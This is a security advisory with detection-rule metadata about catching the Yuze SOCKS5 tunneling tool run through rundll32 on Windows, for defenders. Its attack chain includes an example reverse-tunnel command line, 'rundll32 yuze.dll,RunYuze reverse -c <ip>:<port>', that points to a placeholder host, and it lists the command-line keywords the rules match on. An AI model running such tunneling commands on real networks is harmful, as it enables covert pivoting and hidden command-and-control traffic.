---
title: Potential Protocol Tunneling via Yuze
slug: 2024-01-yuze-tunneling
description: This alert detects potential protocol tunneling activity via the execution of Yuze, a lightweight open-source tunneling tool often used by threat actors for intranet penetration via forward and reverse SOCKS5 proxy tunneling.
date: "2024-01-02T12:00:00Z"
type: advisory
types:
  - advisory
severities:
  - medium
tags:
  - command-and-control
  - tunneling
  - yuze
  - proxy
vendors:
  - Microsoft
  - Elastic
  - Crowdstrike
  - SentinelOne
products:
  - Defender XDR
  - Elastic Defend
  - Elastic Endgame
affected_os:
  - Windows
mitre_ttps:
  - tactic_id: TA0011
    tactic_name: Command and Control
    technique_id: T1572
    technique_name: Protocol Tunneling
  - tactic_id: TA0005
    tactic_name: Defense Evasion
    technique_id: T1090
    technique_name: Proxy
  - tactic_id: TA0005
    tactic_name: Defense Evasion
    technique_id: T1218
    technique_name: System Binary Proxy Execution
references:
  - https://attack.mitre.org/techniques/T1572/
  - https://github.com/P001water/yuze
  - https://www.trendmicro.com/tr_tr/research/26/c/dissecting-a-warlock-attack.html
rules:
  - title: Potential Yuze Tunneling via Rundll32
    description: Detects the execution of Yuze via rundll32.exe, indicating potential protocol tunneling.
    platform: sigma
    severity: medium
    tactics:
      - command_and_control
    techniques:
      - T1218.011
      - T1572
    data_sources:
      - process_creation
      - windows
  - title: Yuze Tunneling - Command Line Arguments
    description: Detects Yuze execution based on command-line arguments associated with tunneling activities.
    platform: sigma
    severity: low
    tactics:
      - command_and_control
    techniques:
      - T1572
    data_sources:
      - process_creation
      - windows
rules_count: 2
---

This rule detects the execution of Yuze, an open-source tunneling tool written in C, which is commonly used for intranet penetration. Yuze supports both forward and reverse SOCKS5 proxy tunneling and is often executed using `rundll32` to load `yuze.dll` with the `RunYuze` export. Threat actors can leverage Yuze to proxy command and control (C2) communications or to pivot within a network. The detection focuses on identifying processes with command-line arguments indicative of Yuze execution, specifically those involving "reverse," "-c," "proxy," "fwd," and "-l" parameters. This activity has been observed in real-world campaigns, increasing the importance of timely detection and response.

## Attack Chain

1.  The attacker gains initial access to a target system through various means (e.g., phishing, exploitation of vulnerabilities).
2.  The attacker uploads or drops the `yuze.dll` file onto the compromised host.
3.  The attacker uses `rundll32.exe` to execute `yuze.dll`, calling the `RunYuze` export.
4.  The command line includes parameters to establish a reverse or forward SOCKS5 proxy tunnel (e.g., `rundll32 yuze.dll,RunYuze reverse -c <ip>:<port>`).
5.  Yuze establishes a tunnel to a remote server, allowing the attacker to proxy network traffic.
6.  The attacker uses the established tunnel to pivot within the network and access internal resources.
7.  The attacker may proxy C2 traffic through the tunnel, masking the true origin of the commands.
8.  The attacker performs actions on the internal network, such as data exfiltration or lateral movement, using the tunnel as a covert channel.

## Impact

Successful exploitation allows attackers to establish covert communication channels, bypass network security controls, and proxy malicious traffic, potentially leading to unauthorized access to sensitive data, lateral movement within the network, and data exfiltration. The use of Yuze can obscure the origin of attacks, making attribution more difficult and hindering incident response efforts.

## Recommendation

*   Deploy the Sigma rule "Potential Yuze Tunneling via Rundll32" to your SIEM to detect the execution of `yuze.dll` via `rundll32.exe` with specific command-line arguments.
*   Enable process creation logging (Sysmon Event ID 1 or Windows Security Auditing) to capture the necessary command-line information for the Sigma rules.
*   Investigate any identified instances of `rundll32.exe` executing `yuze.dll`, focusing on the parent processes and network connections.
*   Block the C2/relay IP or domain found in the `-c` argument at DNS/firewall, as described in the Triage and Analysis section of the rule's note.
